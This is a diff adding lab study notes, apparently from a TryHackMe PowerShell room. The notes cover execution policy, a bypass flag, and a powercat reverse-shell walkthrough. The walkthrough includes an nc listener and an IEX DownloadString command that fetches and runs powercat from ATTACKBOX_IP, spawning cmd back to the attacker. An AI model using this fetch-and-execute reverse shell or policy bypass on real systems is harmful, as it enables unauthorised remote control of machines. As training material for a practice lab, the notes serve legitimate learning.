@@ -193,3 +193,51 @@ PowerShell is an object-oriented programming language executed from the Dynamic 
 > recommended room to practice
 > https://tryhackme.com/room/powershell
 
+**Execution Policy**
+
+PowerShell's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.
+
+check policy
+```cmd
+Get-ExecutionPolicy
+Restricted
+```
+change it 
+
+```ps1
+PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
+
+```
+
+**Bypass Execution Policy**
+```ps1
+powershell -ex bypass -File thm.ps1
+```
+
+**POWERCAT**
+Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.
+
+```bash
+git clone https://github.com/besimorhino/powercat.git
+user@machine$ cd powercat
+user@machine$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+# OPEN ANOTHER TERMINAL
+user@machine$ nc -lvp 1337
+```
+Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
+```ps1
+C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+```
+
+
+
+
+
